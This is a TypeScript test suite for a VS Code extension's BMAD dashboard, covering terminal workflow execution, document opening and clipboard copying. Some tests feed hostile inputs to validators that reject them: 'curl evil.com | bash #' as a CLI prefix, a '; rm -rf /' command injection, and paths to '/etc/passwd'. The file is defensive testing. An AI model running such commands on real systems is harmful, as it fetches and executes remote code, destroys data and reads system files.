import { suite, test, beforeEach, afterEach } from 'mocha';
import * as assert from 'assert';
import * as vscode from 'vscode';
import * as sinon from 'sinon';
import { DashboardViewProvider } from './dashboard-view-provider';
import type { DetectionResult } from '../services/bmad-detector';

/**
 * Create a mock WebviewView with controllable message dispatch.
 * Returns the view mock and a function to simulate incoming messages.
 */
function createMockWebviewView() {
  let messageHandler: ((message: unknown) => void) | undefined;

  const webview = {
    options: {} as vscode.WebviewOptions,
    html: '',
    onDidReceiveMessage: (handler: (message: unknown) => void) => {
      messageHandler = handler;
      return { dispose: () => {} };
    },
    postMessage: sinon.stub().resolves(true),
    asWebviewUri: (uri: vscode.Uri) => uri,
    cspSource: 'https://test.csp',
  };

  const view = {
    webview,
    viewType: 'bmad.dashboardView',
    visible: true,
    onDidChangeVisibility: sinon.stub().returns({ dispose: () => {} }),
    onDidDispose: sinon.stub().returns({ dispose: () => {} }),
    show: sinon.stub(),
    title: 'BMAD Dashboard',
    description: undefined,
    badge: undefined,
  } as unknown as vscode.WebviewView;

  const simulateMessage = (message: unknown) => {
    if (messageHandler) {
      messageHandler(message);
    }
  };

  return { view, webview, simulateMessage };
}

function createDetectedResult(): DetectionResult {
  return {
    detected: true,
    bmadRoot: vscode.Uri.file('/test/_bmad'),
    outputRoot: vscode.Uri.file('/test/_bmad-output'),
  };
}

suite('DashboardViewProvider - EXECUTE_WORKFLOW handler', () => {
  let sandbox: sinon.SinonSandbox;
  let mockTerminal: { show: sinon.SinonStub; sendText: sinon.SinonStub; name: string };
  let createTerminalStub: sinon.SinonStub;

  beforeEach(() => {
    sandbox = sinon.createSandbox();
    mockTerminal = {
      name: 'BMAD',
      show: sandbox.stub(),
      sendText: sandbox.stub(),
    };
    createTerminalStub = sandbox
      .stub(vscode.window, 'createTerminal')
      .returns(mockTerminal as unknown as vscode.Terminal);
  });

  afterEach(() => {
    sandbox.restore();
  });

  test('creates terminal and sends command with CLI prefix on EXECUTE_WORKFLOW message', async () => {
    // Stub terminals as empty array (no existing BMAD terminal)
    sandbox.stub(vscode.window, 'terminals').value([]);

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    // Command payload contains only the BMAD slash command (no CLI prefix)
    simulateMessage({
      type: 'EXECUTE_WORKFLOW',
      payload: { command: '/bmad-bmm-dev-story' },
    });

    // Allow async execution to complete
    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(createTerminalStub.calledOnce, 'Should create a new terminal');
    assert.deepStrictEqual(createTerminalStub.firstCall.args[0], { name: 'BMAD' });
    assert.ok(mockTerminal.show.calledOnce, 'Should show the terminal');
    assert.ok(mockTerminal.sendText.calledOnce, 'Should send command to terminal');
    // executeWorkflow prepends the configured CLI prefix (defaults to 'claude')
    assert.strictEqual(mockTerminal.sendText.firstCall.args[0], 'claude /bmad-bmm-dev-story');
  });

  test('reuses existing BMAD terminal', async () => {
    const existingTerminal = {
      name: 'BMAD',
      show: sandbox.stub(),
      sendText: sandbox.stub(),
    };
    sandbox.stub(vscode.window, 'terminals').value([existingTerminal]);

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'EXECUTE_WORKFLOW',
      payload: { command: '/bmad-bmm-dev-story' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(createTerminalStub.notCalled, 'Should NOT create a new terminal');
    assert.ok(existingTerminal.show.calledOnce, 'Should show existing terminal');
    assert.ok(existingTerminal.sendText.calledOnce, 'Should send command to existing terminal');
  });

  test('uses custom cliPrefix from configuration', async () => {
    sandbox.stub(vscode.window, 'terminals').value([]);
    sandbox.stub(vscode.workspace, 'getConfiguration').returns({
      get: (key: string, defaultValue: string) => (key === 'cliPrefix' ? 'aider' : defaultValue),
    } as unknown as vscode.WorkspaceConfiguration);

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'EXECUTE_WORKFLOW',
      payload: { command: '/bmad-bmm-dev-story' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(mockTerminal.sendText.calledOnce, 'Should send command to terminal');
    assert.strictEqual(mockTerminal.sendText.firstCall.args[0], 'aider /bmad-bmm-dev-story');
  });

  test('rejects cliPrefix with shell metacharacters', async () => {
    sandbox.stub(vscode.window, 'terminals').value([]);
    sandbox.stub(vscode.workspace, 'getConfiguration').returns({
      get: (key: string, defaultValue: string) =>
        key === 'cliPrefix' ? 'curl evil.com | bash #' : defaultValue,
    } as unknown as vscode.WorkspaceConfiguration);
    const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'EXECUTE_WORKFLOW',
      payload: { command: '/bmad-bmm-dev-story' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(createTerminalStub.notCalled, 'Should NOT create a terminal for invalid prefix');
    assert.ok(showErrorStub.calledOnce, 'Should show error message');
  });

  test('rejects command that does not match /bmad- pattern', async () => {
    sandbox.stub(vscode.window, 'terminals').value([]);
    const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'EXECUTE_WORKFLOW',
      payload: { command: '; rm -rf /' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(createTerminalStub.notCalled, 'Should NOT create a terminal for invalid command');
    assert.ok(showErrorStub.calledOnce, 'Should show error message');
    assert.strictEqual(showErrorStub.firstCall.args[0], 'Invalid workflow command');
  });

  test('accepts command with story suffix and sends it to terminal', async () => {
    sandbox.stub(vscode.window, 'terminals').value([]);

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'EXECUTE_WORKFLOW',
      payload: { command: '/bmad-bmm-dev-story story 3.5' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(mockTerminal.sendText.calledOnce, 'Should send command to terminal');
    assert.strictEqual(
      mockTerminal.sendText.firstCall.args[0],
      'claude /bmad-bmm-dev-story story 3.5'
    );
  });
});

suite('DashboardViewProvider - EXECUTE_WORKFLOW error handling', () => {
  let sandbox: sinon.SinonSandbox;

  beforeEach(() => {
    sandbox = sinon.createSandbox();
  });

  afterEach(() => {
    sandbox.restore();
  });

  test('shows error message when terminal creation throws', async () => {
    sandbox.stub(vscode.window, 'terminals').value([]);
    sandbox.stub(vscode.window, 'createTerminal').throws(new Error('Terminal failed'));
    const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'EXECUTE_WORKFLOW',
      payload: { command: '/bmad-bmm-dev-story' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(showErrorStub.calledOnce, 'Should show error message');
    assert.strictEqual(
      showErrorStub.firstCall.args[0],
      'Failed to execute workflow command',
      'Should show correct error message'
    );
  });
});

suite('DashboardViewProvider - OPEN_DOCUMENT handler', () => {
  let sandbox: sinon.SinonSandbox;
  let executeCommandStub: sinon.SinonStub;
  let openTextDocumentStub: sinon.SinonStub;
  let showTextDocumentStub: sinon.SinonStub;

  beforeEach(() => {
    sandbox = sinon.createSandbox();
    executeCommandStub = sandbox.stub(vscode.commands, 'executeCommand').resolves();
    const fakeDocument = { uri: vscode.Uri.file('/test/fake.md') } as vscode.TextDocument;
    openTextDocumentStub = sandbox
      .stub(vscode.workspace, 'openTextDocument')
      .resolves(fakeDocument);
    showTextDocumentStub = sandbox.stub(vscode.window, 'showTextDocument').resolves();
    sandbox
      .stub(vscode.workspace, 'workspaceFolders')
      .value([{ uri: vscode.Uri.file('/test'), name: 'test', index: 0 }]);
  });

  afterEach(() => {
    sandbox.restore();
  });

  test('opens .md files in markdown preview by default', async () => {
    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: 'docs/readme.md' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(executeCommandStub.calledOnce, 'Should call executeCommand');
    assert.strictEqual(
      executeCommandStub.firstCall.args[0],
      'markdown.showPreview',
      'Should use markdown.showPreview command'
    );
    assert.ok(openTextDocumentStub.notCalled, 'Should NOT open as text document');
  });

  test('opens .md files in text editor when forceTextEditor is true', async () => {
    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: 'docs/readme.md', forceTextEditor: true },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(openTextDocumentStub.calledOnce, 'Should open as text document');
    assert.ok(showTextDocumentStub.calledOnce, 'Should show text document');
    assert.ok(executeCommandStub.notCalled, 'Should NOT use markdown.showPreview');
  });

  test('opens non-.md files in text editor regardless of forceTextEditor', async () => {
    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: 'src/index.ts' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(openTextDocumentStub.calledOnce, 'Should open as text document');
    assert.ok(showTextDocumentStub.calledOnce, 'Should show text document');
    assert.ok(executeCommandStub.notCalled, 'Should NOT use markdown.showPreview');
  });

  test('rejects path traversal with .. sequences', async () => {
    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: '../../etc/passwd' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(executeCommandStub.notCalled, 'Should NOT execute any command');
    assert.ok(openTextDocumentStub.notCalled, 'Should NOT open any document');
  });

  test('rejects absolute paths', async () => {
    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: '/etc/passwd' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(executeCommandStub.notCalled, 'Should NOT execute any command');
    assert.ok(openTextDocumentStub.notCalled, 'Should NOT open any document');
  });

  test('shows error message when document opening fails', async () => {
    openTextDocumentStub.rejects(new Error('File not found'));
    const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: 'nonexistent.ts', forceTextEditor: true },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(showErrorStub.calledOnce, 'Should show error message');
    assert.strictEqual(
      showErrorStub.firstCall.args[0],
      'Could not open: nonexistent.ts',
      'Should show correct error message'
    );
  });
});

suite('DashboardViewProvider - OPEN_DOCUMENT story fallback', () => {
  let sandbox: sinon.SinonSandbox;
  let executeCommandStub: sinon.SinonStub;
  let openTextDocumentStub: sinon.SinonStub;
  let showTextDocumentStub: sinon.SinonStub;
  let statStub: sinon.SinonStub;
  let showErrorStub: sinon.SinonStub;
  let originalFs: typeof vscode.workspace.fs;

  const epicsContent = [
    '# Epics',
    '',
    '## Epic 2: File Parsing',
    '',
    '### Story 2.1: Shared Types',
    '',
    'Some content about shared types.',
    '',
    '### Story 2.2: Sprint Parser',
    '',
    'Some content about sprint parser.',
  ].join('\n');

  function createMockEditor() {
    return {
      revealRange: sinon.stub(),
      selection: null as vscode.Selection | null,
    };
  }

  beforeEach(() => {
    sandbox = sinon.createSandbox();
    executeCommandStub = sandbox.stub(vscode.commands, 'executeCommand').resolves();
    showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();

    // vscode.workspace.fs.stat is non-configurable, so replace the whole fs object
    originalFs = vscode.workspace.fs;
    statStub = sinon.stub();
    const fakeFs = { ...originalFs, stat: statStub };
    Object.defineProperty(vscode.workspace, 'fs', { value: fakeFs, configurable: true });

    const fakeDocument = {
      uri: vscode.Uri.file('/test/_bmad-output/planning-artifacts/epics.md'),
      getText: () => epicsContent,
    } as unknown as vscode.TextDocument;
    openTextDocumentStub = sandbox
      .stub(vscode.workspace, 'openTextDocument')
      .resolves(fakeDocument);

    const mockEditor = createMockEditor();
    showTextDocumentStub = sandbox
      .stub(vscode.window, 'showTextDocument')
      .resolves(mockEditor as unknown as vscode.TextEditor);

    sandbox
      .stub(vscode.workspace, 'workspaceFolders')
      .value([{ uri: vscode.Uri.file('/test'), name: 'test', index: 0 }]);
  });

  afterEach(() => {
    Object.defineProperty(vscode.workspace, 'fs', { value: originalFs, configurable: true });
    sandbox.restore();
  });

  test('story file exists — opens normally via markdown preview', async () => {
    // stat succeeds — file exists
    statStub.resolves({ type: vscode.FileType.File });

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: '_bmad-output/implementation-artifacts/2-1-shared-types.md' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(executeCommandStub.calledOnce, 'Should call markdown.showPreview');
    assert.strictEqual(executeCommandStub.firstCall.args[0], 'markdown.showPreview');
    assert.ok(showErrorStub.notCalled, 'Should NOT show error');
  });

  test('story file missing — falls back to epics.md preview with heading fragment', async () => {
    // stat throws — file does not exist
    statStub.rejects(new Error('File not found'));

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: '_bmad-output/implementation-artifacts/2-1-shared-types.md' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    // Should read epics.md to find heading
    assert.ok(openTextDocumentStub.calledOnce, 'Should open epics.md to read content');

    // Should NOT open text editor — preview only
    assert.ok(showTextDocumentStub.notCalled, 'Should NOT show text editor');

    // Should open markdown preview with fragment
    assert.ok(executeCommandStub.calledOnce, 'Should call markdown.showPreview');
    assert.strictEqual(executeCommandStub.firstCall.args[0], 'markdown.showPreview');
    const previewUri = executeCommandStub.firstCall.args[1] as vscode.Uri;
    assert.strictEqual(
      previewUri.fragment,
      'story-21-shared-types',
      'Should have heading fragment'
    );
    assert.ok(showErrorStub.notCalled, 'Should NOT show error');
  });

  test('story file missing with forceTextEditor — falls back to epics.md text editor only', async () => {
    statStub.rejects(new Error('File not found'));

    const mockEditor = createMockEditor();
    showTextDocumentStub.resolves(mockEditor as unknown as vscode.TextEditor);

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: {
        path: '_bmad-output/implementation-artifacts/2-1-shared-types.md',
        forceTextEditor: true,
      },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(openTextDocumentStub.calledOnce, 'Should open epics.md as text document');
    assert.ok(showTextDocumentStub.calledOnce, 'Should show text document');
    assert.ok(mockEditor.revealRange.calledOnce, 'Should call revealRange');
    assert.ok(executeCommandStub.notCalled, 'Should NOT call markdown.showPreview');
    assert.ok(showErrorStub.notCalled, 'Should NOT show error');
  });

  test('story file missing and epics.md missing — shows error', async () => {
    statStub.rejects(new Error('File not found'));
    openTextDocumentStub.rejects(new Error('File not found'));

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: '_bmad-output/implementation-artifacts/2-1-shared-types.md' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(showErrorStub.calledOnce, 'Should show error message');
    assert.strictEqual(
      showErrorStub.firstCall.args[0],
      'Could not open: _bmad-output/implementation-artifacts/2-1-shared-types.md'
    );
  });

  test('story heading not found in epics.md — opens preview without fragment', async () => {
    statStub.rejects(new Error('File not found'));

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    // Story 9.9 does not exist in epicsContent
    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: '_bmad-output/implementation-artifacts/9-9-nonexistent-story.md' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(openTextDocumentStub.calledOnce, 'Should open epics.md to read content');
    assert.ok(showTextDocumentStub.notCalled, 'Should NOT show text editor');
    // Should open preview without fragment (no heading found)
    assert.ok(executeCommandStub.calledOnce, 'Should still call markdown.showPreview');
    const previewUri = executeCommandStub.firstCall.args[1] as vscode.Uri;
    assert.strictEqual(previewUri.fragment, '', 'Should have no fragment');
    assert.ok(showErrorStub.notCalled, 'Should NOT show error');
  });

  test('non-story file missing — shows error without fallback', async () => {
    executeCommandStub.rejects(new Error('File not found'));

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({
      type: 'OPEN_DOCUMENT',
      payload: { path: '_bmad-output/planning-artifacts/prd.md' },
    });

    await new Promise((resolve) => setTimeout(resolve, 50));

    assert.ok(statStub.notCalled, 'Should NOT check file existence for non-story paths');
    assert.ok(showErrorStub.calledOnce, 'Should show error message');
    assert.strictEqual(
      showErrorStub.firstCall.args[0],
      'Could not open: _bmad-output/planning-artifacts/prd.md'
    );
  });
});

suite('DashboardViewProvider - COPY_COMMAND handler', () => {
  let sandbox: sinon.SinonSandbox;

  beforeEach(() => {
    sandbox = sinon.createSandbox();
  });

  afterEach(() => {
    sandbox.restore();
  });

  test('copies command to clipboard on COPY_COMMAND message', async () => {
    // vscode.env.clipboard.writeText is non-configurable, so we test via
    // the real clipboard API (integration-style) and verify by reading back.
    const showInfoStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves();

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    const testCommand = `test-clipboard-${Date.now()}`;
    simulateMessage({
      type: 'COPY_COMMAND',
      payload: { command: testCommand },
    });

    await new Promise((resolve) => setTimeout(resolve, 100));

    // Verify clipboard contents by reading back
    const clipboardContent = await vscode.env.clipboard.readText();
    assert.strictEqual(clipboardContent, testCommand, 'Clipboard should contain the command');
    assert.ok(showInfoStub.calledOnce, 'Should show information message');
  });

  test('shows information message toast after copying', async () => {
    const showInfoStub = sandbox.stub(vscode.window, 'showInformationMessage').resolves();

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({ type: 'COPY_COMMAND', payload: { command: 'test-command' } });

    await new Promise((resolve) => setTimeout(resolve, 100));

    assert.ok(showInfoStub.calledOnce, 'Should show information message');
    assert.strictEqual(
      showInfoStub.firstCall.args[0],
      'Command copied to clipboard',
      'Should show correct toast message'
    );
  });

  test('shows error message when clipboard write fails', async () => {
    // vscode.env.clipboard.writeText is non-configurable, so override via defineProperty
    const originalClipboard = vscode.env.clipboard;
    const fakeClipboard = {
      readText: originalClipboard.readText.bind(originalClipboard),
      writeText: sandbox.stub().rejects(new Error('Clipboard unavailable')),
    };
    Object.defineProperty(vscode.env, 'clipboard', { value: fakeClipboard, configurable: true });

    const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();

    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
    const { view, simulateMessage } = createMockWebviewView();

    provider.resolveWebviewView(
      view,
      {} as vscode.WebviewViewResolveContext,
      new vscode.CancellationTokenSource().token
    );

    simulateMessage({ type: 'COPY_COMMAND', payload: { command: '/bmad-bmm-dev-story' } });

    await new Promise((resolve) => setTimeout(resolve, 100));

    assert.ok(showErrorStub.calledOnce, 'Should show error message');
    assert.strictEqual(
      showErrorStub.firstCall.args[0],
      'Failed to copy command to clipboard',
      'Should show correct error message'
    );

    // Restore original clipboard
    Object.defineProperty(vscode.env, 'clipboard', {
      value: originalClipboard,
      configurable: true,
    });
  });
});
